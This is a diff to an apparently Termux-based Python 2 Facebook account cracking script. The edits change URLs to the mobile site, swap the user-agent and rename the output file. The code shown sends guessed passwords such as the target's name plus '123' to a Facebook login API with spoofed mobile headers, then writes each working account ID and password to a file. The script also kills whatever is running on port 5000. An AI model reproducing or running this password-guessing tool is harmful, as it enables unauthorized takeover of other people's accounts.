@@ -3,7 +3,7 @@
 #coding=utf-8
 #real codding by Jam Shahrukh
 try:
-    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,mechanize,requests
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
     from multiprocessing.pool import ThreadPool
 except ImportError:
     os.system("pip2 install requests")
@@ -15,7 +15,7 @@ except ImportError:
 
 """
 try:
-    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
+    my = requests.get("https://m.facebook.com/Jam.shahrukh.official")
 except requests.exceptions.ConnectionError:
     print("")
     print("\t    \033[1;97mTurn on mobile data\033[0;97m")
@@ -44,7 +44,7 @@ if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_module
     print("")
     print("")
     print("")
-    os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
+    os.system("xdg-open https://m.facebook.com/Jam.shahrukh.official")
     time.sleep(10)
 elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
@@ -60,7 +60,7 @@ elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/
     print("")
     print("")
     print("")
-    os.system("xdg-open https://www.facebook.com/jam.shahrukh.official")
+    os.system("xdg-open https://m.facebook.com/jam.shahrukh.official")
     time.sleep(10)
     print("")
     print("")
@@ -75,7 +75,7 @@ elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/
     time.sleep(5)
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
 sys.setdefaultencoding("utf-8")
 c = "\033[1;32m"
@@ -315,6 +315,7 @@ def b_menu_select():
 	
 	
 	def main(arg):
+		global cekpoint,oks
 		user=arg
 		uid,name=user.split("|")
 		try:
@@ -323,10 +324,10 @@ def b_menu_select():
 		    d=json.loads(q)
 		    if "access_token" in d:
 		        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass1+"\x1b[1;92m | \x1b[1;92m"+name)
-		        cp=open("cp.txt","a")
-		        cp.write(uid+" | "+pass1+"\n")
-		        cp.close()
-		        cps.append(uid)
+		        ok=open("ok.txt","a")
+		        ok.write(uid+" | "+pass1+"\n")
+		        ok.close()
+		        oks.append(uid)
 		    else:
 		            pass2=name+"123"
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
